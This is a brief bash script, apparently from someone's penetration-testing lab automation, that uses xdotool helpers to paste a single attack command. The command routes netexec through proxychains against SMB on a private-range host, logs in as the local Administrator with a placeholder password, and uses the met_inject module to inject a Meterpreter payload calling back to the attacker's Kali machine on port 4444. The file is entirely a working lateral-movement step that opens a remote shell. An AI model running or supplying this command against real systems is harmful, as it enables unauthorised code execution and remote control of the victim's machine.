#!/bin/bash

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh

paste_command "proxychains netexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M met_inject -o SRVHOST=${KALI_IP} SRVPORT=4444"
 